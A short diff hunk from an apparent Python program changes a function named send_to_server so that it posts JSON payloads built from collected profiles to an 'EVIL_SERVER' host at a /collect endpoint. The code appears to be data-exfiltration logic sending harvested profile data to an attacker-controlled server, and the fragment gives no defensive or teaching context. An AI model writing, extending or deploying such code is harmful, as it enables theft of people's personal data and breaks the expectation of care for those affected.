@@ -54,7 +54,7 @@ def send_to_server(profiles):
             ).strip()
         }
         response = requests.post(
-            f"{EVIL_SERVER}",
+            f"{EVIL_SERVER}/collect",
             data=json.dumps(payload),
             headers=headers,
             timeout=10
